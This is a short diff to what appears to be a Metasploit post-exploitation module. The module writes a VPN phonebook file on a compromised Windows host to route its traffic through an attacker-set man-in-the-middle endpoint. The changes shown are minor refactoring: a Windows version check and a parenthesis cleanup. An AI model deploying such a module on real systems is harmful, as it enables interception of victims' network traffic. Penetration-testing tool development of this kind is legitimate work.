@@ -42,7 +42,8 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    disable_network_wizard if sysinfo['OS'] =~ /Windows 7|Vista|2008/
+    version = get_version_info
+    disable_network_wizard if version.build_number.between?(Msf::WindowsVersion::Vista_SP0, Msf::WindowsVersion::Win7_SP1)
 
     pbk = create_pbk(datastore['MITM'], datastore['PBK_NAME'])
     to = (datastore['TIMEOUT'] <= 0) ? 60 : datastore['TIMEOUT']
@@ -77,7 +78,7 @@ class MetasploitModule < Msf::Post
 
   def create_pbk(mim, pbk_name)
     pbk_dir = expand_path('%TEMP%')
-    pbk_file = pbk_dir << '\\' << Rex::Text.rand_text_alpha((rand(6..13))) << '.pbk'
+    pbk_file = pbk_dir << '\\' << Rex::Text.rand_text_alpha(rand(6..13)) << '.pbk'
 
     conf_conn = "[#{pbk_name}]\r\n\r\n"
     conf_conn += "MEDIA=rastapi\r\n"
